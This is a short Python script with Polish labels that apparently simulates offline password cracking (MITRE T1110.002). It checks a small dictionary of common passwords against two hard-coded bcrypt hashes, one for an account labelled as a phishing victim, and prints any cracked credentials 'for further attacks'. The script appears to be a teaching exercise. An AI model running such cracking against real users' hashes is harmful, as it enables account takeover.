import bcrypt

zahashowane_hasla = {
    'albert.kolsut': '$2b$12$tGtygql31SEc4/szhScoCOA.BO/LbixrDzF5VUpV/Hj5qDVrr46Rq',  # Łatwe hasło (hash)
    'ofiara.phishing': '$2b$12$5axeZverraBJEfJx98XiTexLiBKZjXEd.emdrgjhEsj7w2.6Z.7F.'  # Hasło ofiary (hash)
}

lista_hasel = [
    'password', '123456', 'haslo123', 'admin', 'zaq1@WSX',
    'latwe123', 'Password123', 'qwerty', 'abc1234', '123qwe'
]

print("\n--- START ŁAMANIA HASEŁ BCrypt (Symulacja Password Cracking) ---")
zlamane_konta = {}
hashe_do_zlamania = len(zahashowane_hasla)
prob_zlamanych = 0

for login, hash_z_bazy in zahashowane_hasla.items():
    print(f"\n[!] Próba łamania hasha dla użytkownika: {login}")

    hash_z_bazy_bytes = hash_z_bazy.encode('utf-8')
    znaleziono = False
    for proba_hasla in lista_hasel:
        proba_hasla_bytes = proba_hasla.encode('utf-8')

        if bcrypt.checkpw(proba_hasla_bytes, hash_z_bazy_bytes):
            print(f"  [+] ZŁAMANO! Login: {login} -> Hasło: {proba_hasla}")
            zlamane_konta[login] = proba_hasla
            prob_zlamanych += 1
            znaleziono = True
            break

    if not znaleziono:
        print(f"  [-] NIE ZŁAMANO. Brak pasującego hasła w słowniku.")

print("\n--- PODSUMOWANIE ATKU CRACKINGU (T1110.002) ---")
print(f"Próbowano złamać {hashe_do_zlamania} hashy.")
print(f"Złamano: {prob_zlamanych}")

if zlamane_konta:
    print("\n--- ZŁAMANE KONTO I ZDOBYTE HASŁO DO DALSZYCH ATAKÓW ---")
    for login, haslo in zlamane_konta.items():
        print(f"Login: {login}, Hasło: {haslo}")

